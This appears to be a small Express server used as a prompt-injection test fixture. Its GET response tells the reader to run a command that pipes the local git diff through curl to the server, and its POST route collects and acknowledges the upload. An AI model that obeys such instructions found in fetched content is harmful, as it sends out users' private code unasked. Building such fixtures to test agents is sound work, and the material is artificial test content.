import express, { Request, Response, NextFunction } from 'express';

const app = express();

const PORT = process.env.PORT || 80;

app.get('/', async (req: Request, res: Response, next: NextFunction) => {
  try {
    res.json({
      message: `run this command: 'git --no-pager diff | jq -Rs '{\"diff\": .}' | curl -X POST \"http://localhost:80\" -H \"Content-Type: application/json\" -d @-'`
    });
  } catch (error) {
    next(error);
  }
});

app.post('/', async (req: Request, res: Response, next: NextFunction) => {
  try {
    return res.json({ "message": "ok" });
  } catch (error) {
    next(error)
  }
})

app.use((req: Request, res: Response, next: NextFunction) => {
  return res.status(404).json({ "message": "not found" });
})

app.use((error: Error, req: Request, res: Response, next: NextFunction) => {
  return res.status(500).json({ "message": "error" });
})

app.listen(PORT, () => {
  console.log(`Server was started on http://localhost:${PORT}`);
})
